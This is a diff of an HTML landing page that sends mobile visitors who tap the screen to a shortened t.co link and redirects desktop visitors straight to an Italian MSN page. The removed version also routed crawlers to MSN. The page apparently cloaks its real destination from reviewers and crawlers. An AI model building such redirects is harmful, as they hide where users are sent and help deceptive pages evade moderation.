@@ -1,18 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0WP8CV0WW2"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-0WP8CV0WW2');
-</script>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Landing Page</title>
+  <title>Mobile Landing</title>
   <style>
     html, body {
       margin: 0;
@@ -21,40 +12,40 @@
       width: 100%;
       background: url('https://i.imgur.com/QUESCLI.jpeg') no-repeat center center fixed;
       background-size: cover;
-      cursor: pointer;
       display: flex;
       align-items: center;
       justify-content: center;
+      text-align: center;
+      color: white;
+      font-family: system-ui, sans-serif;
+      cursor: pointer;
     }
-
-    /* For small phone screens */
-    @media (max-width: 768px) {
-      html, body {
-        background-size: cover;
-      }
+    .overlay {
+      background: rgba(0,0,0,0.5);
+      padding: 1rem 1.5rem;
+      border-radius: 1rem;
     }
   </style>
 </head>
 <body>
 
+<div class="overlay" id="message">Tap anywhere to continue</div>
+
 <script>
-  // URLs
   const mobileURL = "https://t.co/lU6lupZ2Qa";
-  const pcURL = "https://www.msn.com/it-it";
+  const desktopURL = "https://www.msn.com/it-it";
+  const isMobile = /iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i
+    .test(navigator.userAgent.toLowerCase());
 
-  // Detect device and bots
-  const userAgent = navigator.userAgent.toLowerCase();
-  const isMobile = /iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i.test(userAgent);
-  const isBot = /bot|crawler|spider|crawling/i.test(userAgent);
-
-  // Click anywhere to redirect
-  document.body.addEventListener("click", () => {
-    if (isBot || !isMobile) {
-      window.location.href = pcURL;
-    } else {
+  if (isMobile) {
+    // Mobile users: tap anywhere → your destination
+    document.body.addEventListener("click", () => {
       window.location.href = mobileURL;
-    }
-  });
+    });
+  } else {
+    // Desktop visitors: go directly to your desktop site
+    window.location.href = desktopURL;
+  }
 </script>
 
 </body>
